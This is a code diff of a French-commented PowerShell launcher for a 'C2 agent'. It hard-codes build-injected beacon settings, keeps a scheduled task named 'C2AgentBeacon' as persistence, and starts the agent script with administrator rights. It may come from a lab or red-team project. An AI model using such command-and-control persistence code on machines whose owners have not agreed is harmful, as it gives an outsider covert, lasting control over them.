@@ -4,25 +4,29 @@
 <#
 .SYNOPSIS
     Launcher script pour l'agent C2
-    Charge la configuration depuis config.json et exécute agent_active.ps1
+    Exécute agent_active.ps1 avec les paramètres injectés lors du build
 
 .DESCRIPTION
     Ce script :
-    - Charge le fichier de configuration JSON
-    - Extrait les paramètres ServerUrl et BeaconInterval
-    - Exécute l'agent principal avec les paramètres appropriés
+    - Exécute l'agent principal avec les paramètres pré-configurés
+    - Les paramètres sont injectés lors de la compilation du MSI
     - Gère les logs structurés
+    - S'assure que la tâche planifiée existe
 
 .NOTES
     Ce script doit être exécuté en tant qu'administrateur
-    Emplacement standard : C:\Program Files\C2Agent\launcher.ps1
+    Les paramètres sont injectés lors du build via build-msi.ps1
 #>
 
-param(
-    [string]$ConfigPath = "$PSScriptRoot\config.json"
-)
-
 $ErrorActionPreference = "Stop"
+
+# ===== PARAMÈTRES INJECTÉS LORS DU BUILD =====
+# Les valeurs suivantes sont remplacées par build-msi.ps1
+# lors de la compilation du MSI
+$serverUrl = "http://localhost:8000/api"
+$beaconInterval = 30
+$logFilePath = "C:\Program Files\C2Agent\logs\agent.log"
+# ============================================
 
 # Fonctions utilitaires
 function Write-Log {
@@ -52,56 +56,17 @@ function Write-Log {
     }
 }
 
-function Load-Configuration {
-    param([string]$ConfigPath)
-    
-    if (-not (Test-Path -Path $ConfigPath)) {
-        Write-Log "Configuration file not found: $ConfigPath" "ERROR"
-        return $null
-    }
-    
-    try {
-        $config = Get-Content -Path $ConfigPath | ConvertFrom-Json
-        Write-Log "Configuration loaded successfully from $ConfigPath" "SUCCESS"
-        return $config
-    }
-    catch {
-        Write-Log "Failed to parse configuration file: $_" "ERROR"
-        return $null
-    }
-}
-
-function Ensure-LogDirectory {
-    param([string]$LogFilePath)
-    
-    $logDir = Split-Path -Parent -Path $LogFilePath
-    
-    if (-not (Test-Path -Path $logDir)) {
-        try {
-            New-Item -ItemType Directory -Path $logDir -Force | Out-Null
-            Write-Log "Created log directory: $logDir" "INFO"
-        }
-        catch {
-            Write-Log "Failed to create log directory: $_" "ERROR"
-            return $false
-        }
-    }
-    
-    return $true
-}
-
-function Expand-EnvironmentVariables {
-    param([string]$Path)
-    
-    # Remplace les variables d'environnement
-    return [System.Environment]::ExpandEnvironmentVariables($Path)
-}
-
 function Ensure-ScheduledTask {
     param(
         [string]$LauncherPath,
         [string]$LogFilePath
     )
+    
+    # NOTE: La tâche planifiée devrait être créée par la Custom Action du MSI pendant l'installation.
+    # Cette fonction est un fallback au cas où :
+    # - La Custom Action aurait échoué
+    # - Le script est exécuté manuellement ou via d'autres moyens
+    # - La tâche aurait été supprimée
     
     $taskName = "C2AgentBeacon"
     
@@ -115,7 +80,7 @@ function Ensure-ScheduledTask {
         return $true
     }
     
-    Write-Log "Scheduled task does not exist, creating it..." "WARNING" $LogFilePath
+    Write-Log "Scheduled task does not exist, creating it (FALLBACK)..." "WARNING" $LogFilePath
     
     try {
         # Créer l'action
@@ -163,29 +128,23 @@ function Ensure-ScheduledTask {
 
 Write-Host ""
 Write-Host "========================================================" -ForegroundColor Cyan
-Write-Host "        C2 AGENT - Configuration Launcher" -ForegroundColor Cyan
+Write-Host "        C2 AGENT - Launcher" -ForegroundColor Cyan
 Write-Host "========================================================" -ForegroundColor Cyan
 Write-Host ""
 
-# Charger la configuration
-$config = Load-Configuration -ConfigPath $ConfigPath
-
-if (-not $config) {
-    Write-Log "Cannot continue without valid configuration" "ERROR"
-    exit 1
-}
-
-# Extraire les paramètres de configuration
-$serverUrl = $config.agent.serverUrl
-$beaconInterval = $config.agent.beaconInterval
-$logFilePath = Expand-EnvironmentVariables $config.agent.logFile
-
 # Créer le répertoire des logs s'il n'existe pas
-$logsReady = Ensure-LogDirectory -LogFilePath $logFilePath
+$logDir = Split-Path -Parent -Path $logFilePath
 
-if (-not $logsReady) {
-    $logFilePath = "$PSScriptRoot\agent.log"
-    Write-Log "Using fallback log path: $logFilePath" "WARNING"
+if (-not (Test-Path -Path $logDir)) {
+    try {
+        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
+        Write-Log "Created log directory: $logDir" "INFO"
+    }
+    catch {
+        Write-Log "Failed to create log directory: $_" "ERROR"
+        $logFilePath = "$PSScriptRoot\agent.log"
+        Write-Log "Using fallback log path: $logFilePath" "WARNING"
+    }
 }
 
 Write-Log "Server URL: $serverUrl" "INFO" $logFilePath
@@ -202,14 +161,14 @@ if (-not (Test-Path -Path $agentScriptPath)) {
 
 Write-Log "Starting agent..." "INFO" $logFilePath
 
-# Vérifier et créer la tâche planifiée si nécessaire
+# Vérifier et créer la tâche planifiée si nécessaire (fallback)
 $taskReady = Ensure-ScheduledTask -LauncherPath $PSCommandPath -LogFilePath $logFilePath
 
 if (-not $taskReady) {
     Write-Log "Warning: Scheduled task could not be created or verified" "WARNING" $logFilePath
 }
 
-# Exécuter l'agent avec les paramètres de configuration
+# Exécuter l'agent avec les paramètres injectés
 try {
     & $agentScriptPath `
         -ServerUrl $serverUrl `
